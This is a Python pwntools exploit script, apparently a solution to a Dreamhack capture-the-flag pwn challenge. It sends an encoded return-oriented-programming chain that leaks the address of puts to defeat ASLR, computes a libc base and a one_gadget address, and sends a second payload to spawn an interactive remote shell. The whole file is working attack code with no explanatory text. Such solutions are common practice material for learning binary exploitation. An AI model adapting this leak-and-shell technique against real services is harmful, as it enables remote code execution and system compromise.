from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 11210
r = remote(HOST, PORT)

main = 0x401574
puts_got = 0x404018
puts_plt = 0x4010a0
pop_rdi = 0x4012c5

def convert(val):
    local = val
    converted = []
    while local != 0:
        write = local & 0xff
        converted.append(b'E' + hex(write)[2:].lower().encode())
        local = local >> 8
    return b'C'.join(converted)

payload = b'C'*31 + convert(pop_rdi)
payload += b'C'*6 + convert(puts_got)
payload += b'C'*6 + convert(puts_plt) + b'CE00'
payload += b'C'*5 + convert(main) + b'CE00'*3 + b'B'
r.sendline(payload)

libc = u64(r.recvline().strip().ljust(8, b'\x00')) - 0x80e50
sh = libc + 0xebd3f
payload = b'C'*31 + convert(sh) + b'B'
r.sendline(payload)

r.interactive()
